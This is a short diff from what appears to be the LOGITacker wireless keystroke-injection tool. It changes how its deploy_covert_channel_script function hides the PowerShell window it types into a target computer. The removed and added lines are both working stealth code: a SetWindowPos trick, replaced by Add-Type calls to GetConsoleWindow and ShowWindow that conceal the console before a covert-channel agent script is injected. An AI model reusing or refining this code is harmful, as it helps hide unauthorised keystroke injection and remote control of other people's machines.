@@ -49,9 +49,9 @@ void deploy_covert_channel_script(bool hide) {
     logitacker_script_engine_append_task_delay(2000);
 
     if (hide) {
-        logitacker_script_engine_append_task_type_string("$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);");
-        logitacker_script_engine_append_task_type_string("$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(\"WindowsBase\")).GetType(\"MS.Win32.UnsafeNativeMethods\"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n");
-        logitacker_script_engine_append_task_delay(500);
+    logitacker_script_engine_append_task_type_string("Add-Type -Namespace Win32 -Name Api -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow();");
+    logitacker_script_engine_append_task_type_string("[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; $h = [Win32.Api]::GetConsoleWindow(); [Win32.Api]::ShowWindow($h, 0);");
+    logitacker_script_engine_append_task_delay(500);
     }
 
     while (strlen(agentscript) >= 128) {
